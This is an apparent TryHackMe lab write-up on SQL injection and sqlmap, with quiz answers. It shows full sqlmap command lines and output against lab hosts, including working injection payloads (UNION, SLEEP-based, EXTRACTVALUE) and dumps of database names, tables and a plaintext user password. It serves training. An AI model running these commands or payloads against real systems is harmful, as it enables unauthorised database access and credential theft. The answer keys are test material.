| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **# SQLMap: The Basics** |

## Contents
- [Introduction](#introduction)
- [SQL Injection Vulnerability](#sql-injection-vulnerability)
- [Automated SQL Injection Tool](#automated-sql-injection-tool)
- [Practical Exercise](#practical-exercise)


## Introduction
SQL injection, a common vulnerability that has been around forever.


### ❓ Question
> Which language builds the interaction between a website and its database?
#### 🧪 Process
Structured Query Language, A.K.A `SQL`

Trying this as the answer
#### ✅ Answer
- `SQL` ✅

## SQL Injection Vulnerability
Use un-validated input to trick SQL in giving you data.

### ❓ Question 1
> Which boolean operator checks if at least one side of the operator is true for the condition to be true?
#### 🧪 Process
Use `OR` to say is the the user there `OR does 1 = 1`. Well of course 1 does = 1 so that is true, meaning the result is true.

Trying this as the answer
#### ✅ Answer
- `OR` ✅

### ❓ Question 2
> Is 1=1 in an SQL query always true? (YEA/NAY)
#### 🧪 Process
`1=1` is a mathematical constant. so Yea

Trying this as the answer
#### ✅ Answer
- `Yea`


## Automated SQL Injection Tool

We can use SQLMap to automate testing

```shell
user@ubuntu:~$ sqlmap --wizard
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.2.4#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]

[*] starting at 08:42:50

[08:42:50] [INFO] starting wizard interface
Please enter full target URL (-u): 
```

- `--dbs`
	- helps find database names on the url
- `-D %db_name% --tables`
	- will show you the tables
- `-D %db_name% -T %table_name% --dump`
	- 'enumerates' the records



```shell
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
      __H__
 ___ ___[']_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:43:49] [INFO] testing connection to the target URL
[08:43:49] [INFO] heuristics detected web page charset 'ascii'
[08:43:49] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[08:43:49] [INFO] testing if the target URL content is stable
[08:43:50] [INFO] target URL content is stable
[08:43:50] [INFO] testing if GET parameter 'cat' is dynamic
[text removed]
[08:45:04] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
[text removed]
[08:45:08] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cat' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: cat=1 AND EXTRACTVALUE(1846,CONCAT(0x5c,0x716a787071,(SELECT (ELT(1846=1846,1))),0x7170766a71))

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: cat=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 11 columns
    Payload: cat=1 UNION ALL SELECT CONCAT(0x716a787071,0x714d486661414f6456787a4a55796b6c7a78574f7858507a6e6a725647436e64496f4965794c6873,0x7170766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HMgq
---
[08:45:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[text removed]
```

`--dbs` flag

```text
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:49:00] [INFO] resuming back-end DBMS' mysql' 
[08:49:00] [INFO] testing connection to the target URL
[08:49:01] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]    
[08:49:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:49:01] [INFO] fetching database names
available databases [2]:
[*] users
[*] members

[text removed]
```


%table_name% = `users`

```text          
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:50:46] [INFO] resuming back-end DBMS' mysql' 
[08:50:46] [INFO] testing connection to the target URL
[08:50:46] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:50:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:50:46] [INFO] fetching tables for database: 'users'
Database: acuart
[3 tables]
+-----------+
| johnath   |
| alexas    |
| thomas    |     
+-----------+

[text removed]
```

using -D users -T thomas

```text  
user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[text removed]
[08:51:48] [INFO] resuming back-end DBMS' mysql' 
[08:51:48] [INFO] testing connection to the target URL
[08:51:49] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cat (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cat=1 AND 2175=2175
[text removed]
[08:51:49] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx, PHP 5.6.40
back-end DBMS: MySQL >= 5.1
[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
[08:51:49] [INFO] fetching entries for table 'thomas' in database' users'
[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
do you want to store hashes to a temporary file for eventual further processing n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: users
Table: thomas
[1 entry]
+---------------------+------------+---------+
| Date                | name       | pass    |    
+---------------------+------------+----------
| 09/09/2024          | Thomas THM | testing |    
+---------------------+------------+---------+

[text removed]
```



### ❓ Question 1
> Which flag in the SQLMap tool is used to extract all the databases available?
#### 🧪 Process
This is `dbs` 

Trying this as the answer
#### ✅ Answer
- `--dbs` ✅

### ❓ Question 2
> What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)
#### 🧪 Process
we need -u %url% -D %database_name% followed by --tables
#### ✅ Answer
- `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables` ✅

## Practical Exercise
Target: `http://10.10.195.126/ai/login
![](Images/Pasted%20image%2020250622165343.png)


Right click page and click **Inspect**
![](Images/Pasted%20image%2020250622165626.png)
The inspect page will show up
![](Images/Pasted%20image%2020250622165529.png)

Click the **Network** tab
![](Images/Pasted%20image%2020250622165718.png)

Enter some sample data in the _Email Address_, the _Password_ fields and click **Continue**. 
> _I used email: me@home.thm and password: `password`_
![](Images/Pasted%20image%2020250622170045.png)

Lets switchover to the actual practical
### ❓ Question 1
> How many databases are available in this web application?
#### 🧪 Process
What we need to know:
- **GET URL**: `http://10.10.196.230/ai/includes/user_login?email=test&password=test`
- **Target IP:** `10.10.195.126`
- **Tooling**: `/usr/bin/sqlmap`

Now we have the Get URL we can use this in conjunction with `-dbs` to find databases. using the command `/usr/bin/sqlmap -u 'http://10.10.196.230/ai/includes/user_login?email=test&password=test' -dbs`

```sql
root@ip-10-10-229-230:~# /usr/bin/sqlmap -u 'http://10.10.196.230/ai/includes/user_login?email=test&password=test' -dbs
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .`| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:22:01 /2025-06-22/

[19:22:01] [INFO] testing connection to the target URL
[19:22:01] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:22:01] [INFO] testing if the target URL content is stable
[19:22:02] [INFO] target URL content is stable
[19:22:02] [INFO] testing if GET parameter 'email' is dynamic
[19:22:02] [INFO] GET parameter 'email' appears to be dynamic
[19:22:02] [WARNING] heuristic (basic) test shows that GET parameter 'email' might not be injectable
[19:22:02] [INFO] testing for SQL injection on GET parameter 'email'
[19:22:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:22:02] [WARNING] reflective value(s) found and filtering out
[19:22:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:22:07] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:22:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:22:07] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:22:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:22:07] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[19:22:07] [INFO] testing 'Generic inline queries'
[19:22:07] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:22:07] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[19:22:07] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:22:07] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:22:07] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:22:27] [INFO] GET parameter 'email' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:22:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:22:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:22:57] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:22:57] [INFO] target URL appears to have 4 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[19:23:02] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[19:23:02] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[19:23:03] [INFO] checking if the injection point on GET parameter 'email' is a false positive
GET parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 148 HTTP(s) requests:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 6085 FROM (SELECT(SLEEP(5)))wLGD) AND 'Idnd'='Idnd&password=test
---
[19:23:51] [INFO] the back-end DBMS is MySQL
[19:23:51] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:24:01] [INFO] fetching database names
[19:24:01] [INFO] fetching number of databases
[19:24:01] [INFO] retrieved: 6
[19:24:31] [INFO] retrieved: information_schema
[19:34:03] [INFO] retrieved: ai
[19:34:44] [INFO] retrieved: mysql
[19:37:24] [INFO] retrieved: performance_schema
[19:46:36] [INFO] retrieved: phpmyadmin
[19:52:17] [INFO] retrieved: test
available databases [6]:
[*] ai
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] test

[19:54:38] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.196.230'
[19:54:38] [WARNING] you haven`t updated sqlmap for more than 1906 days!!!

[*] ending @ 19:54:38 /2025-06-22/
```

Although the full transaction above shows alot of data, I noticed during the process the line `[19:24:01] [INFO] retrieved: 6.` We can use this at the number of databases.
![](Images/Pasted%20image%2020250622193739.png)

Trying this as the answer
#### ✅ Answer
- `6` ✅

### ❓ Question 2
> What is the name of the table available in the "ai" database?
#### 🧪 Process
Once the list of databases are found we can replace the argument `--dbs` with `-D ai --tables` to list the tables within the database `ai`

```sql
root@ip-10-10-229-230:~# /usr/bin/sqlmap -u 'http://10.10.196.230/ai/includes/user_login?email=test&password=test' -D 'ai' --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .`| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:56:26 /2025-06-22/

[19:56:27] [INFO] resuming back-end DBMS 'mysql' 
[19:56:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 6085 FROM (SELECT(SLEEP(5)))wLGD) AND 'Idnd'='Idnd&password=test
---
[19:56:27] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[19:56:27] [INFO] fetching tables for database: 'ai'
[19:56:27] [INFO] fetching number of tables for database 'ai'
[19:56:27] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[19:56:27] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
1
[19:56:43] [INFO] retrieved: 
[19:57:03] [INFO] adjusting time delay to 1 second due to good response times
user
Database: ai
[1 table]
+------+
| user |
+------+

[19:57:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.196.230'
[19:57:23] [WARNING] you haven`t updated sqlmap for more than 1906 days!!!

[*] ending @ 19:57:23 /2025-06-22/
```

Here we see that there is just the one table `users`. 

Trying this as the answer
#### ✅ Answer
- `users` ✅

### ❓ Question 3
> What is the password of the email test@chatai.com?
#### 🧪 Process
Now we can extend the command, changing `--tables` for `-T 'user' --dump` to get the data from the table

```sql
root@ip-10-10-229-230:~# /usr/bin/sqlmap -u 'http://10.10.196.230/ai/includes/user_login?email=test&password=test' -D 'ai' -T 'user' --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.4#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user`s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:01:18 /2025-06-22/

[20:01:18] [INFO] resuming back-end DBMS 'mysql' 
[20:01:18] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: email (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=test' AND (SELECT 6085 FROM (SELECT(SLEEP(5)))wLGD) AND 'Idnd'='Idnd&password=test
---
[20:01:18] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:01:18] [INFO] fetching columns for table 'user' in database 'ai'
[20:01:18] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[20:01:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
4
[20:01:34] [INFO] retrieved: 
[20:01:54] [INFO] adjusting time delay to 1 second due to good response times
id
[20:02:03] [INFO] retrieved: email
[20:02:29] [INFO] retrieved: password
[20:03:25] [INFO] retrieved: created
[20:04:02] [INFO] fetching entries for table 'user' in database 'ai'
[20:04:02] [INFO] fetching number of entries for table 'user' in database 'ai'
[20:04:02] [INFO] retrieved: 1
[20:04:04] [WARNING] reflective value(s) found and filtering out of statistical model, please wait      
.............................. (done)
1
[20:04:08] [INFO] retrieved: 12345678
[20:04:55] [INFO] retrieved: 2023-02-21 09:05:46
[20:07:06] [INFO] retrieved: test@chatai.com
Database: ai
Table: user
[1 entry]
+------+-----------------+---------------------+------------+
| id   | email           | created             | password   |
+------+-----------------+---------------------+------------+
| 1    | test@chatai.com | 2023-02-21 09:05:46 | 12345678   |
+------+-----------------+---------------------+------------+

[20:08:41] [INFO] table 'ai.`user`' dumped to CSV file '/root/.sqlmap/output/10.10.196.230/dump/ai/user.csv'
[20:08:41] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.196.230'
[20:08:41] [WARNING] you haven't updated sqlmap for more than 1906 days!!!

[*] ending @ 20:08:41 /2025-06-22/
```

Trying this as the answer
#### ✅ Answer
- `12345678` ✅